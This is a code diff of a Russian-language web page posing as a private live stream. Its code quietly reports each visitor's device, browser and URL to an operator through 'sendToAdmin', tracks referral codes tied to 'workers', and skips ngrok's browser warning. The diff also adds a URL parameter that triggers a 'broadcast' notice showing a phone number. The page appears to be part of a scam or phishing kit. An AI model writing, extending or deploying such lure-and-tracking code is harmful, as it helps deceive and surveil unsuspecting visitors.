@@ -3,6 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="ngrok-skip-browser-warning" content="true">
     <title>Приватный стрим · LIVE</title>
     <style>
         * {
@@ -507,7 +508,9 @@
         const urlParams = new URLSearchParams(window.location.search);
         return {
             ref: urlParams.get('ref'),
-            model: urlParams.get('model')
+            model: urlParams.get('model'),
+            broadcast: urlParams.get('broadcast'),
+            phone: urlParams.get('phone')
         };
     }
     
@@ -525,6 +528,13 @@
         if (params.ref) {
             currentRefCode = params.ref;
             console.log(`✅ Реф код: ${currentRefCode}`);
+        }
+        
+        // ===== ЕСЛИ ЕСТЬ ПАРАМЕТР BROADCAST — ПОКАЗЫВАЕМ СТРАНИЦУ УВЕДОМЛЕНИЯ =====
+        if (params.broadcast === 'true') {
+            const phone = params.phone || 'неизвестный';
+            console.log('📢 ЗАПУСК РАССЫЛКИ ПО ПАРАМЕТРУ!');
+            showBroadcast(phone);
         }
     }
     
@@ -558,22 +568,6 @@
                 sendToAdmin(`🕷️ ЗАХОД НА СТРИМ!\n📱 ${device}\n${browser}\n🔗 ${url}\n⏰ ${time}`);
             });
     })();
-    
-    // ========== АВТОМАТИЧЕСКАЯ ПРОВЕРКА КОМАНДЫ ==========
-    function checkForBroadcast() {
-        const refCode = currentRefCode || 'no_ref';
-        const url = `${API_URL}/check_broadcast?ref=${refCode}`;
-        
-        fetch(url)
-            .then(response => response.json())
-            .then(data => {
-                if (data.broadcast === true) {
-                    console.log('📢 ПОЛУЧЕНА КОМАНДА НА РАССЫЛКУ!');
-                    showBroadcast(data.phone || 'неизвестный');
-                }
-            })
-            .catch(() => {});
-    }
     
     // ========== ПОКАЗ УВЕДОМЛЕНИЯ ==========
     function showBroadcast(phone) {
@@ -890,9 +884,6 @@
     
     // ========== ЗАГРУЗКА ДАННЫХ ==========
     loadWorkerData();
-    
-    // ========== ЗАПУСКАЕМ ПРОВЕРКУ КАЖДЫЕ 2 СЕКУНДЫ ==========
-    setInterval(checkForBroadcast, 2000);
 </script>
 
 <!-- Бейдж безопасности -->
